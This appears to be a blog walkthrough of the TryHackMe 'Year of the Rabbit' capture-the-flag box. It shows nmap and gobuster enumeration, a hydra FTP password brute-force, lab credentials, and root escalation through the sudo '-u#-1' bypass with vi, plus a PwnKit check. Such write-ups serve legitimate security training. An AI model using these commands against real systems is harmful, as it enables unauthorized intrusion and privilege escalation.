---
title: Walkthrough - Year of the Rabbit
published: true
---

Time to enter the warren... Can you hack into the Year of the Rabbit box without falling down a hole?

[https://tryhackme.com/room/yearoftherabbit](https://tryhackme.com/room/yearoftherabbit)

* * *

## Notes

- running nmap we get a few open ports

```shell
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.10 (Debian)
```

- a gobuster scan gives us /assets/ and checking the stylesheet there we get a hint

```css
 Nice to see someone checking the stylesheets.
 Take a look at the page: /sup3r_s3cr3t_fl4g.php
```

- accessing this page takes us to a page where it tells us to disable javascript. We can do this in Firefox by visiting ``about:config`` - this takes us to ``/sup3r_s3cret_fl4g/`` and another flag inside of the video? Nope- Rickrolled

- now running the request to ``/sup3r_s3cr3t_fl4g.php`` and capturing with burp proxy we see a hudden dir. ``/WExYY2Cv-qU``

![0xskar](/assets/rabbit01.png)

![0xskar](/assets/rabbit0.png)

- download the hot babe she's hiding something.
- running ``strings`` on her we get the information needed to access the ftp server
- ``Eh, you've earned this. Username for FTP is ftpuser`` followed by a list of passwords?
- ``hydra -l ftpuser -P ftp_passes.lst 10.10.220.193 ftp`` to get our credentials for the ftp
- login to the ftp server and mget eli's creds.
- eli's creds are a brainfuck cipher. dcode.fr to get access

* * * 

## User Flag

- eli:DSpDiM1wAEwid
- ``find / -type d -iname "s3cr3t" 2>/dev/null``

```shell
eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root

eli@year-of-the-rabbit:/usr/games/s3cr3t$ su gwendoline
Password: 
gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ cd /home
gwendoline@year-of-the-rabbit:/home$ ls
eli  gwendoline
gwendoline@year-of-the-rabbit:/home$ cd gwendoline/
gwendoline@year-of-the-rabbit:~$ ls -las
total 24
4 drwxr-xr-x 2 gwendoline gwendoline 4096 Jan 23  2020 .
4 drwxr-xr-x 4 root       root       4096 Jan 23  2020 ..
0 lrwxrwxrwx 1 root       root          9 Jan 23  2020 .bash_history -> /dev/null
4 -rw-r--r-- 1 gwendoline gwendoline  220 Jan 23  2020 .bash_logout
4 -rw-r--r-- 1 gwendoline gwendoline 3515 Jan 23  2020 .bashrc
4 -rw-r--r-- 1 gwendoline gwendoline  675 Jan 23  2020 .profile
4 -r--r----- 1 gwendoline gwendoline   46 Jan 23  2020 user.txt
gwendoline@year-of-the-rabbit:~$ cat user.txt
```

* * * 

## Root Flag

```shell
User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

- ``[+] 10.10.220.193 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: The target is vulnerable.``

- alternatively
- ``sudo --version``

- ``sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt``

- and then in vi ``:!/bin/bash``

* * * 
